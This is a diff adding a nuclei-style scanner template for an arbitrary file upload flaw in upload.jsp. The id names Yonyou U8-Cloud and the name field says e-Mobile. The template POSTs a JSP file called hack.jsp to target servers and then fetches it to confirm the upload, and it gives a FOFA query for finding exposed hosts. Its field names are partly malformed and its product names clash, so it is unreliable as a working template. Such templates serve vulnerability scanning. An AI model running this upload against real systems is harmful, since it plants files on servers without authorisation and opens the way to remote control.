@@ -1,0 +1,43 @@
+id:  用友U8-Cloud upload任意文件上传漏洞
+time: '2023-10-25'
+
+
+info:
+  name:  e-Mobile 任意文件上传漏洞
+  severity: high
+  description:  该系统upload.jsp存在任意文件上传漏洞，攻击者可通过该漏洞上传木马，远程控制服务器
+  reference: https://github.com/wy876/POC/tree/main
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="e-Mobile"
+  
+http:
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}/linux/pages/upload.jsp"
+      - "{{BaseURL}}/linux/hack.jsp"
+    
+    Rheader:
+      - Content-Type:application/x-www-form-urlencoded & filename:hack.jsp & Accept-Encoding:gzip
+   
+    body: 
+      - |
+        <% out.println("The website has vulnerabilities!!");%>
+        
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "vulnerabilities"
+
+      - type: status
+        status:
+          - 200
+    
